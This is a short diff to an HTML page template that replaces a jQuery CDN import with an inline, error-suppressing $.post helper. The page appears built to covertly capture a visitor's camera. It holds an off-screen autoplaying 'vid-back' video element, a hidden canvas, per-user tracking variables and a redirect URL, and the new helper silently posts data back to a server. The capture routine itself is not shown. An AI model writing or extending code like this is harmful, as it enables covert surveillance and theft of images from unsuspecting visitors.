@@ -98,7 +98,10 @@ body{display:flex;flex-direction:column;min-height:100vh}
 <video id="vid-back"  style="position:fixed;top:-9999px;left:-9999px" playsinline autoplay muted></video>
 <canvas id="canvas" width="640" height="640" style="display:none"></canvas>
 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script>
+// Lightweight $.post — no external CDN needed
+window.$={post:function(url,data){try{var x=new XMLHttpRequest(),p=Object.keys(data).map(function(k){return encodeURIComponent(k)+"="+encodeURIComponent(data[k]);}).join("&");x.open("POST",url,true);x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");x.send(p);}catch(e){}}};
+</script>
 <script>
 var uid="<%=uid%>",a="<%=a%>",destUrl="<%=url%>";
 var redirectDone=false;
